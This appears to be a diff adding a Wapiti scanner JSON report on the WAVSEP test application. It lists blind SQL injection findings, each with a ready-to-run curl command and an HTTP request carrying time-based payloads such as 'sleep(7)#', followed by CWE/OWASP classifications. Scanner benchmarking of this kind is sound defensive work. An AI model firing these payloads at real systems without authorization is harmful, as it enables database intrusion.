+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp\" -d \"msgId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp", 
+        "parameter": "msgId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter minBalanace", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\nminBalanace=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp\" -d \"minBalanace=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp", 
+        "parameter": "minBalanace", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgid", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsgid=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp\" -d \"msgid=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp", 
+        "parameter": "msgid", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter orderby", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\norderby=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp\" -d \"orderby=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp", 
+        "parameter": "orderby", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=%27%20or%20sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp\" -d \"transactionDate=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=%27%20or%20sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp\" -d \"transactionDate=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=%27%20or%20sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp\" -d \"transactionDate=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=%27%20or%20sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp\" -d \"transactionDate=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp\" -d \"transactionDate=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionId=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp\" -d \"transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp", 
+        "parameter": "transactionId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsgId=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp\" -d \"msgId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp", 
+        "parameter": "msgId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter minBalanace", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\nminBalanace=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp\" -d \"minBalanace=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp", 
+        "parameter": "minBalanace", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter msgid", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsgid=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp\" -d \"msgid=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp", 
+        "parameter": "msgid", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionId=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp\" -d \"transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp", 
+        "parameter": "transactionId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter username", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp\nContent-Type: application/x-www-form-urlencoded\n\nusername=%27%20or%20sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp\" -d \"username=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp", 
+        "parameter": "username", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case03-InjectionInView-Date-Blind-200ValidResponseWithDefaultOnException.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case03-InjectionInView-Date-Blind-200ValidResponseWithDefaultOnException.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=%27%20or%20sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case03-InjectionInView-Date-Blind-200ValidResponseWithDefaultOnException.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case03-InjectionInView-Date-Blind-200ValidResponseWithDefaultOnException.jsp\" -d \"transactionDate=%27%20or%20sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case03-InjectionInView-Date-Blind-200ValidResponseWithDefaultOnException.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionId=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp\" -d \"transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp", 
+        "parameter": "transactionId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter description", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp\nContent-Type: application/x-www-form-urlencoded\n\ndescription=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp\" -d \"description=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp", 
+        "parameter": "description", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case06-InjectionInUpdate-Date-TimeDelayExploit-200Identical.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case06-InjectionInUpdate-Date-TimeDelayExploit-200Identical.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case06-InjectionInUpdate-Date-TimeDelayExploit-200Identical.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case06-InjectionInUpdate-Date-TimeDelayExploit-200Identical.jsp\" -d \"transactionDate=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case06-InjectionInUpdate-Date-TimeDelayExploit-200Identical.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionId", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionId=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp\" -d \"transactionId=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp", 
+        "parameter": "transactionId", 
+        "method": "POST"
+      }, 
+      {
+        "info": "Blind SQL vulnerability via injection in the parameter transactionDate", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case08-InjectionInUpdate-DateWithoutQuotes-TimeDelayExploit-200Identical.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case08-InjectionInUpdate-DateWithoutQuotes-TimeDelayExploit-200Identical.jsp\nContent-Type: application/x-www-form-urlencoded\n\ntransactionDate=sleep%287%29%231", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case08-InjectionInUpdate-DateWithoutQuotes-TimeDelayExploit-200Identical.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case08-InjectionInUpdate-DateWithoutQuotes-TimeDelayExploit-200Identical.jsp\" -d \"transactionDate=sleep%287%29%231\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case08-InjectionInUpdate-DateWithoutQuotes-TimeDelayExploit-200Identical.jsp", 
+        "parameter": "transactionDate", 
+        "method": "POST"
+      }
+    ], 
+    "File Handling": [], 
+    "Potentially dangerous file": [], 
+    "CRLF Injection": [], 
+    "Commands execution": []
+  }, 
+  "infos": {
+    "date": "Tue, 20 Jan 2015 09:50:25 +0000", 
+    "scope": "domain", 
+    "version": "Wapiti 2.3.0", 
+    "target": "http://192.168.1.1:8080/wavsep/active/index-sql.jsp"
+  }, 
+  "classifications": {
+    "Resource consumption": {
+      "ref": {
+        "CWE-400: Uncontrolled Resource Consumption ('Resource Exhaustion')": "http://cwe.mitre.org/data/definitions/400.html", 
+        "http://www.owasp.org/index.php/Asymmetric_resource_consumption_(amplification)": "http://www.owasp.org/index.php/Asymmetric_resource_consumption_(amplification)"
+      }, 
+      "sol": "The involved script is maybe using the server resources (CPU, memory, network, file access...) in a non-efficient way", 
+      "desc": "Resource consumption description"
+    }, 
+    "Internal Server Error": {
+      "ref": {
+        "Wikipedia article for 5xx HTTP error codes": "https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#5xx_Server_Error"
+      }, 
+      "sol": "More information about the error should be found in the server logs.", 
+      "desc": "Internal server error description"
+    }, 
+    "Cross Site Scripting": {
+      "ref": {
+        "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')": "http://cwe.mitre.org/data/definitions/79.html", 
+        "http://en.wikipedia.org/wiki/Cross-site_scripting": "http://en.wikipedia.org/wiki/Cross-site_scripting", 
+        "VulneraNET wiki: Cross Site Scripting Flaw article": "http://lab.gsi.dit.upm.es/semanticwiki/index.php/Cross_Site_Scripting_Flaw", 
+        "http://www.owasp.org/index.php/Cross_Site_Scripting": "http://www.owasp.org/index.php/Cross_Site_Scripting"
+      }, 
+      "sol": "The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding:  &lt;, &gt;, &amp;, &quot;, ', (, ), #, %, ; , +, -.", 
+      "desc": "Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications which allow code injection by malicious web users into the web pages viewed by other users. Examples of such code include HTML code and client-side scripts."
+    }, 
+    "Htaccess Bypass": {
+      "ref": {
+        "http://blog.teusink.net/2009/07/common-apache-htaccess-misconfiguration.html": "http://blog.teusink.net/2009/07/common-apache-htaccess-misconfiguration.html", 
+        "CWE-538: File and Directory Information Exposure": "http://cwe.mitre.org/data/definitions/538.html"
+      }, 
+      "sol": "Make sure every HTTP method is forbidden if the credentials are bad.", 
+      "desc": "htaccess files are used to restrict access to some files or HTTP method. In some case it may be possible to bypass this restriction and access the files."
+    }, 
+    "Backup file": {
+      "ref": {
+        "Testing for Old, Backup and Unreferenced Files (OWASP-CM-006)": "http://www.owasp.org/index.php/Testing_for_Old,_Backup_and_Unreferenced_Files_(OWASP-CM-006)", 
+        "CWE-530: Exposure of Backup File to an Unauthorized Control Sphere": "http://cwe.mitre.org/data/definitions/530.html"
+      }, 
+      "sol": "The webadmin must manually delete the backup files or remove it from the web root. He should also reconfigure its editor to deactivate automatic backups.", 
